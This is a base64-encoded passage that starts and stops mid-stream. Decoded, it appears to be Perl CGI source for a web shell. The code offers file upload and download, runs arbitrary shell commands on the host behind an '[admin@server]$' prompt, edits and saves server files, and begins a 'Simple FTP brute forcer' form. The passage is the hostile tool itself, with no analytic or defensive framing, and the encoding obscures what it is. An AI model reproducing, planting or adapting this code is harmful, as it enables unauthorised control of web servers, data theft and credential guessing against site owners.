3JpcHRMb2NhdGlvbiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJkb3dubG9hZCI+CiRQcm9tcHQgZG93bmxvYWQ8YnI+PGJyPgpGaWxlbmFtZTogPGlucHV0IGNsYXNzPSJmaWxlIiB0eXBlPSJ0ZXh0IiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4KRG93bmxvYWQ6IDxpbnB1dCBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+Cgo8L2Zvcm0+CkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gdXBsb2FkIGZpbGVzCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50RmlsZVVwbG9hZEZvcm0KewoJbXkgJGRpcj0gJkFkZExpbmtEaXIoInVwbG9hZCIpOwoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRkaXJdXCQgIjsKCXJldHVybiA8PEVORDsKPGZvcm0gbmFtZT0iZiIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+CiRQcm9tcHQgdXBsb2FkPGJyPjxicj4KRmlsZW5hbWU6IDxpbnB1dCBjbGFzcz0iZmlsZSIgdHlwZT0iZmlsZSIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+Ck9wdGlvbnM6ICZuYnNwOzxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0ibyIgaWQ9InVwIiB2YWx1ZT0ib3ZlcndyaXRlIj4KPGxhYmVsIGZvcj0idXAiPk92ZXJ3cml0ZSBpZiBpdCBFeGlzdHM8L2xhYmVsPjxicj48YnI+ClVwbG9hZDombmJzcDsmbmJzcDsmbmJzcDs8aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmVnaW4iPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPgo8aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0idXBsb2FkIj4KCjwvZm9ybT4KCkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdGltZW91dCBmb3IgYSBjb21tYW5kIGV4cGlyZXMuIFdlIG5lZWQgdG8KIyB0ZXJtaW5hdGUgdGhlIHNjcmlwdCBpbW1lZGlhdGVseS4gVGhpcyBmdW5jdGlvbiBpcyB2YWxpZCBvbmx5IG9uIFVuaXguIEl0IGlzCiMgbmV2ZXIgY2FsbGVkIHdoZW4gdGhlIHNjcmlwdCBpcyBydW5uaW5nIG9uIE5ULgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBDb21tYW5kVGltZW91dAp7CglpZighJFdpbk5UKQoJewoJCWFsYXJtKDApOwoJCXJldHVybiA8PEVORDsKPC90ZXh0YXJlYT4KPGJyPjxmb250IGNvbG9yPXllbGxvdz4KQ29tbWFuZCBleGNlZWRlZCBtYXhpbXVtIHRpbWUgb2YgJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gc2Vjb25kKHMpLjwvZm9udD4KPGJyPjxmb250IHNpemU9JzYnIGNvbG9yPXJlZD5LaWxsZWQgaXQhPC9mb250PgpFTkQKCX0KfQoKCgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBkaXNwbGF5cyB0aGUgcGFnZSB0aGF0IGNvbnRhaW5zIGEgbGluayB3aGljaCBhbGxvd3MgdGhlIHVzZXIKIyB0byBkb3dubG9hZCB0aGUgc3BlY2lmaWVkIGZpbGUuIFRoZSBwYWdlIGFsc28gY29udGFpbnMgYSBhdXRvLXJlZnJlc2gKIyBmZWF0dXJlIHRoYXQgc3RhcnRzIHRoZSBkb3dubG9hZCBhdXRvbWF0aWNhbGx5LgojIEFyZ3VtZW50IDE6IEZ1bGx5IHF1YWxpZmllZCBmaWxlbmFtZSBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50RG93bmxvYWRMaW5rUGFnZQp7Cglsb2NhbCgkRmlsZVVybCkgPSBAXzsKCW15ICRyZXN1bHQ9IiI7CglpZigtZSAkRmlsZVVybCkgIyBpZiB0aGUgZmlsZSBleGlzdHMKCXsKCQkjIGVuY29kZSB0aGUgZmlsZSBsaW5rIHNvIHdlIGNhbiBzZW5kIGl0IHRvIHRoZSBicm93c2VyCgkJJEZpbGVVcmwgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOwoJCSREb3dubG9hZExpbmsgPSAiJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZj0kRmlsZVVybCZvPWdvIjsKCQkkSHRtbE1ldGFIZWFkZXIgPSAiPG1ldGEgSFRUUC1FUVVJVj1cIlJlZnJlc2hcIiBDT05URU5UPVwiMTsgVVJMPSREb3dubG9hZExpbmtcIj4iOwoJCSZQcmludFBhZ2VIZWFkZXIoImMiKTsKCQkkcmVzdWx0IC49IDw8RU5EOwpTZW5kaW5nIEZpbGUgJFRyYW5zZmVyRmlsZS4uLjxicj4KCklmIHRoZSBkb3dubG9hZCBkb2VzIG5vdCBzdGFydCBhdXRvbWF0aWNhbGx5LAo8YSBocmVmPSIkRG93bmxvYWRMaW5rIj5DbGljayBIZXJlPC9hPgpFTkQKCQkkcmVzdWx0IC49ICZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOwoJfQoJZWxzZSAjIGZpbGUgZG9lc24ndCBleGlzdAoJewoJCSRyZXN1bHQgLj0gIkZhaWxlZCB0byBkb3dubG9hZCAkRmlsZVVybDogJCEiOwoJCSRyZXN1bHQgLj0gJlByaW50RmlsZURvd25sb2FkRm9ybTsKCX0KCXJldHVybiAkcmVzdWx0Owp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiByZWFkcyB0aGUgc3BlY2lmaWVkIGZpbGUgZnJvbSB0aGUgZGlzayBhbmQgc2VuZHMgaXQgdG8gdGhlCiMgYnJvd3Nlciwgc28gdGhhdCBpdCBjYW4gYmUgZG93bmxvYWRlZCBieSB0aGUgdXNlci4KIyBBcmd1bWVudCAxOiBGdWxseSBxdWFsaWZpZWQgcGF0aG5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgc2VudC4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgU2VuZEZpbGVUb0Jyb3dzZXIKewoJbXkgJHJlc3VsdCA9ICIiOwoJbG9jYWwoJFNlbmRGaWxlKSA9IEBfOwoJaWYob3BlbihTRU5ERklMRSwgJFNlbmRGaWxlKSkgIyBmaWxlIG9wZW5lZCBmb3IgcmVhZGluZwoJewoJCWlmKCRXaW5OVCkKCQl7CgkJCWJpbm1vZGUoU0VOREZJTEUpOwoJCQliaW5tb2RlKFNURE9VVCk7CgkJfQoJCSRGaWxlU2l6ZSA9IChzdGF0KCRTZW5kRmlsZSkpWzddOwoJCSgkRmlsZW5hbWUgPSAkU2VuZEZpbGUpID1+ICBtIShbXi9eXFxdKikkITsKCQlwcmludCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXVua25vd25cbiI7CgkJcHJpbnQgIkNvbnRlbnQtTGVuZ3RoOiAkRmlsZVNpemVcbiI7CgkJcHJpbnQgIkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSQxXG5cbiI7CgkJcHJpbnQgd2hpbGUoPFNFTkRGSUxFPik7CgkJY2xvc2UoU0VOREZJTEUpOwoJCWV4aXQoMSk7Cgl9CgllbHNlICMgZmFpbGVkIHRvIG9wZW4gZmlsZQoJewoJCSRyZXN1bHQgLj0gIkZhaWxlZCB0byBkb3dubG9hZCAkU2VuZEZpbGU6ICQhIjsKCQkkcmVzdWx0IC49JlByaW50RmlsZURvd25sb2FkRm9ybTsKCX0KCXJldHVybiAkcmVzdWx0Owp9CgoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgZG93bmxvYWRzIGEgZmlsZS4gSXQgZGlzcGxheXMgYSBtZXNzYWdlCiMgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluayB0aHJvdWdoIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLgojIFRoaXMgZnVuY3Rpb24gaXMgYWxzbyBjYWxsZWQgd2hlbiB0aGUgdXNlciBjbGlja3Mgb24gdGhhdCBsaW5rLiBJbiB0aGlzIGNhc2UsCiMgdGhlIGZpbGUgaXMgcmVhZCBhbmQgc2VudCB0byB0aGUgYnJvd3Nlci4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgQmVnaW5Eb3dubG9hZAp7CgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwKCQkoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUKCXsKCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7Cgl9CgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQoJewoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87CgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsKCX0KCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQoJewoJCSZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7Cgl9CgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQoJewoJCSZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlLiBJZiB0aGUKIyBmaWxlIGlzIG5vdCBzcGVjaWZpZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGEKIyBmaWxlLCBvdGhlcndpc2UgaXQgc3RhcnRzIHRoZSB1cGxvYWQgcHJvY2Vzcy4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgVXBsb2FkRmlsZQp7CgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgdXBsb2FkIGZvcm0gYWdhaW4KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpCgl7CgkJcmV0dXJuICZQcmludEZpbGVVcGxvYWRGb3JtOwoKCX0KCW15ICRyZXN1bHQ9IiI7CgkjIHN0YXJ0IHRoZSB1cGxvYWRpbmcgcHJvY2VzcwoJJHJlc3VsdCAuPSAiVXBsb2FkaW5nICRUcmFuc2ZlckZpbGUgdG8gJEN1cnJlbnREaXIuLi48YnI+IjsKCgkjIGdldCB0aGUgZnVsbGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBjcmVhdGVkCgljaG9wKCRUYXJnZXROYW1lKSBpZiAoJFRhcmdldE5hbWUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsKCSRUcmFuc2ZlckZpbGUgPX4gbSEoW14vXlxcXSopJCE7CgkkVGFyZ2V0TmFtZSAuPSAkUGF0aFNlcC4kMTsKCgkkVGFyZ2V0RmlsZVNpemUgPSBsZW5ndGgoJGlueydmaWxlZGF0YSd9KTsKCSMgaWYgdGhlIGZpbGUgZXhpc3RzIGFuZCB3ZSBhcmUgbm90IHN1cHBvc2VkIHRvIG92ZXJ3cml0ZSBpdAoJaWYoLWUgJFRhcmdldE5hbWUgJiYgJE9wdGlvbnMgbmUgIm92ZXJ3cml0ZSIpCgl7CgkJJHJlc3VsdCAuPSAiRmFpbGVkOiBEZXN0aW5hdGlvbiBmaWxlIGFscmVhZHkgZXhpc3RzLjxicj4iOwoJfQoJZWxzZSAjIGZpbGUgaXMgbm90IHByZXNlbnQKCXsKCQlpZihvcGVuKFVQTE9BREZJTEUsICI+JFRhcmdldE5hbWUiKSkKCQl7CgkJCWJpbm1vZGUoVVBMT0FERklMRSkgaWYgJFdpbk5UOwoJCQlwcmludCBVUExPQURGSUxFICRpbnsnZmlsZWRhdGEnfTsKCQkJY2xvc2UoVVBMT0FERklMRSk7CgkJCSRyZXN1bHQgLj0gIlRyYW5zZmVyZWQgJFRhcmdldEZpbGVTaXplIEJ5dGVzLjxicj4iOwoJCQkkcmVzdWx0IC49ICJGaWxlIFBhdGg6ICRUYXJnZXROYW1lPGJyPiI7CgkJfQoJCWVsc2UKCQl7CgkJCSRyZXN1bHQgLj0gIkZhaWxlZDogJCE8YnI+IjsKCQl9Cgl9CgkkcmVzdWx0IC49ICZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOwoJcmV0dXJuICRyZXN1bHQ7Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZS4gSWYgdGhlCiMgZmlsZW5hbWUgaXMgbm90IHNwZWNpZmllZCwgaXQgZGlzcGxheXMgYSBmb3JtIGFsbG93aW5nIHRoZSB1c2VyIHRvIHNwZWNpZnkgYQojIGZpbGUsIG90aGVyd2lzZSBpdCBkaXNwbGF5cyBhIG1lc3NhZ2UgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluawojIHRocm91Z2ggIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBEb3dubG9hZEZpbGUKewoJIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwgcHJpbnQgdGhlIGRvd25sb2FkIGZvcm0gYWdhaW4KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpCgl7CgkJJlByaW50UGFnZUhlYWRlcigiZiIpOwoJCXJldHVybiAmUHJpbnRGaWxlRG93bmxvYWRGb3JtOwoJfQoJCgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwgKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBwYXRoIGlzIGFic29sdXRlCgl7CgkJJFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOwoJfQoJZWxzZSAjIHBhdGggaXMgcmVsYXRpdmUKCXsKCQljaG9wKCRUYXJnZXRGaWxlKSBpZigkVGFyZ2V0RmlsZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOwoJCSRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7Cgl9CgoJaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUKCXsKCQlyZXR1cm4gJlNlbmRGaWxlVG9Ccm93c2VyKCRUYXJnZXRGaWxlKTsKCX0KCWVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQgb25seSB0aGUgbGluayBwYWdlCgl7CgkJcmV0dXJuICZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOwoJfQp9CgoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHRvIGV4ZWN1dGUgY29tbWFuZHMuIEl0IGRpc3BsYXlzIHRoZSBvdXRwdXQgb2YgdGhlCiMgY29tbWFuZCBhbmQgYWxsb3dzIHRoZSB1c2VyIHRvIGVudGVyIGFub3RoZXIgY29tbWFuZC4gVGhlIGNoYW5nZSBkaXJlY3RvcnkKIyBjb21tYW5kIGlzIGhhbmRsZWQgZGlmZmVyZW50bHkuIEluIHRoaXMgY2FzZSwgdGhlIG5ldyBkaXJlY3RvcnkgaXMgc3RvcmVkIGluCiMgYW4gaW50ZXJuYWwgdmFyaWFibGUgYW5kIGlzIHVzZWQgZWFjaCB0aW1lIGEgY29tbWFuZCBoYXMgdG8gYmUgZXhlY3V0ZWQuIFRoZQojIG91dHB1dCBvZiB0aGUgY2hhbmdlIGRpcmVjdG9yeSBjb21tYW5kIGlzIG5vdCBkaXNwbGF5ZWQgdG8gdGhlIHVzZXJzCiMgdGhlcmVmb3JlIGVycm9yIG1lc3NhZ2VzIGNhbm5vdCBiZSBkaXNwbGF5ZWQuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIEV4ZWN1dGVDb21tYW5kCnsKCW15ICRyZXN1bHQ9IiI7CglpZigkUnVuQ29tbWFuZCA9fiBtL15ccypjZFxzKyguKykvKSAjIGl0IGlzIGEgY2hhbmdlIGRpciBjb21tYW5kCgl7CgkJIyB3ZSBjaGFuZ2UgdGhlIGRpcmVjdG9yeSBpbnRlcm5hbGx5LiBUaGUgb3V0cHV0IG9mIHRoZQoJCSMgY29tbWFuZCBpcyBub3QgZGlzcGxheWVkLgoJCSRDb21tYW5kID0gImNkIFwiJEN1cnJlbnREaXJcIiIuJENtZFNlcC4iY2QgJDEiLiRDbWRTZXAuJENtZFB3ZDsKCQljaG9wKCRDdXJyZW50RGlyID0gYCRDb21tYW5kYCk7CgkJJHJlc3VsdCAuPSAmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsKCgkJJHJlc3VsdCAuPSAiQ29tbWFuZDogPHJ1bj4kUnVuQ29tbWFuZCA8L3J1bj48YnI+PHRleHRhcmVhIGNvbHM9JyRjb2xzJyByb3dzPSckcm93cycgc3BlbGxjaGVjaz0nZmFsc2UnPiI7CgkJIyB4dWF0IHRob25nIHRpbiBraGkgY2h1eWVuIGRlbiAxIHRodSBtdWMgbmFvIGRvIQoJCSRSdW5Db21tYW5kPSAkV2luTlQ/ImRpciI6ImRpciAtbGlhIjsKCQkkcmVzdWx0IC49ICZSdW5DbWQ7Cgl9ZWxzaWYoJFJ1bkNvbW1hbmQgPX4gbS9eXHMqZWRpdFxzKyguKykvKQoJewoJCSRyZXN1bHQgLj0gICZTYXZlRmlsZUZvcm07Cgl9ZWxzZQoJewoJCSRyZXN1bHQgLj0gJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07CgkJJHJlc3VsdCAuPSAiQ29tbWFuZDogPHJ1bj4kUnVuQ29tbWFuZDwvcnVuPjxicj48dGV4dGFyZWEgaWQ9J2RhdGEnIGNvbHM9JyRjb2xzJyByb3dzPSckcm93cycgc3BlbGxjaGVjaz0nZmFsc2UnPiI7CgkJJHJlc3VsdCAuPSZSdW5DbWQ7Cgl9CgkkcmVzdWx0IC49ICAiPC90ZXh0YXJlYT4iOwoJcmV0dXJuICRyZXN1bHQ7Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBydW4gY29tbWFuZAojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgpzdWIgUnVuQ21kCnsKCW15ICRyZXN1bHQ9IiI7CgkkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuJFJ1bkNvbW1hbmQuJFJlZGlyZWN0b3I7CglpZighJFdpbk5UKQoJewoJCSRTSUd7J0FMUk0nfSA9IFwmQ29tbWFuZFRpbWVvdXQ7CgkJYWxhcm0oJENvbW1hbmRUaW1lb3V0RHVyYXRpb24pOwoJfQoJaWYoJFNob3dEeW5hbWljT3V0cHV0KSAjIHNob3cgb3V0cHV0IGFzIGl0IGlzIGdlbmVyYXRlZAoJewoJCSR8PTE7CgkJJENvbW1hbmQgLj0gIiB8IjsKCQlvcGVuKENvbW1hbmRPdXRwdXQsICRDb21tYW5kKTsKCQl3aGlsZSg8Q29tbWFuZE91dHB1dD4pCgkJewoJCQkkXyA9fiBzLyhcbnxcclxuKSQvLzsKCQkJJHJlc3VsdCAuPSAmSHRtbFNwZWNpYWxDaGFycygiJF9cbiIpOwoJCX0KCQkkfD0wOwoJfQoJZWxzZSAjIHNob3cgb3V0cHV0IGFmdGVyIGNvbW1hbmQgY29tcGxldGVzCgl7CgkJJHJlc3VsdCAuPSAmSHRtbFNwZWNpYWxDaGFycygnJENvbW1hbmQnKTsKCX0KCWlmKCEkV2luTlQpCgl7CgkJYWxhcm0oMCk7Cgl9CglyZXR1cm4gJHJlc3VsdDsKfQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiMgRm9ybSBTYXZlIEZpbGUgCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0Kc3ViIFNhdmVGaWxlRm9ybQp7CglteSAkcmVzdWx0ID0iIjsKCXN1YnN0cigkUnVuQ29tbWFuZCwwLDUpPSIiOwoJbXkgJGZpbGU9JnRyaW0oJFJ1bkNvbW1hbmQpOwoJJHNhdmU9Jzxicj48aW5wdXQgbmFtZT0iYSIgdHlwZT0ic3VibWl0IiB2YWx1ZT0ic2F2ZSIgY2xhc3M9InN1Ym1pdCIgPic7CgkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4kUnVuQ29tbWFuZDsKCW15ICRkaXI9IjxzcGFuIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7IGZvbnQtd2VpZ2h0OiBib2xkOyc+Ii4mQWRkTGlua0RpcigiZ3VpIikuIjwvc3Bhbj4iOwoJaWYoLXcgJEZpbGUpCgl7CgkJJHJvd3M9IjIzIgoJfWVsc2UKCXsKCQkkbXNnPSI8YnI+PGZvbnQgc3R5bGU9J2ZvbnQ6IDE1cHQgVmVyZGFuYTsgY29sb3I6IHllbGxvdzsnID4gUGVybWlzc2lvbiBkZW5pZWQhPGZvbnQ+PGJyPiI7CgkJJHJvd3M9IjIwIgoJfQoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICI8Zm9udCBjb2xvcj0nI0ZGRkZGRic+W2FkbWluXEAkU2VydmVyTmFtZSAkZGlyXVwkPC9mb250PiAiOwoJJHJlYWQ9KCRXaW5OVCk/InR5cGUiOiJsZXNzIjsKCSRSdW5Db21tYW5kID0gIiRyZWFkIFwiJFJ1bkNvbW1hbmRcIiI7CgkkcmVzdWx0IC49ICA8PEVORDsKCTxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPgoKCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+CgkkUHJvbXB0Cgk8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iNDAiIG5hbWU9ImMiPgoJPGlucHV0IG5hbWU9InMiIGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4KCTxicj5Db21tYW5kOiA8cnVuPiAkUnVuQ29tbWFuZCA8L3J1bj4KCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImZpbGUiIHZhbHVlPSIkZmlsZSIgPiAkc2F2ZSA8YnI+ICRtc2cKCTxicj48dGV4dGFyZWEgaWQ9ImRhdGEiIG5hbWU9ImRhdGEiIGNvbHM9IiRjb2xzIiByb3dzPSIkcm93cyIgc3BlbGxjaGVjaz0iZmFsc2UiPgpFTkQKCQoJJHJlc3VsdCAuPSAmUnVuQ21kOwoJJHJlc3VsdCAuPSAgIjwvdGV4dGFyZWE+IjsKCSRyZXN1bHQgLj0gICI8L2Zvcm0+IjsKCXJldHVybiAkcmVzdWx0Owp9CiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KIyBTYXZlIEZpbGUKIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQpzdWIgU2F2ZUZpbGUoJCkKewoJbXkgJERhdGE9IHNoaWZ0IDsKCW15ICRGaWxlPSBzaGlmdDsKCSRGaWxlPSRDdXJyZW50RGlyLiRQYXRoU2VwLiRGaWxlOwoJaWYob3BlbihGSUxFLCAiPiRGaWxlIikpCgl7CgkJYmlubW9kZSBGSUxFOwoJCXByaW50IEZJTEUgJERhdGE7CgkJY2xvc2UgRklMRTsKCQlyZXR1cm4gMTsKCX1lbHNlCgl7CgkJcmV0dXJuIDA7Cgl9Cn0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIEJydXRlIEZvcmNlciBGb3JtCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIEJydXRlRm9yY2VyRm9ybQp7CglteSAkcmVzdWx0PSIiOwoJJHJlc3VsdCAuPSA8PEVORDsKCjx0YWJsZT4KCjx0cj4KPHRkIGNvbHNwYW49IjIiIGFsaWduPSJjZW50ZXIiPgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyM8YnI+ClNpbXBsZSBGVFAgYnJ1dGUgZm9yY2VyPGJyPgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI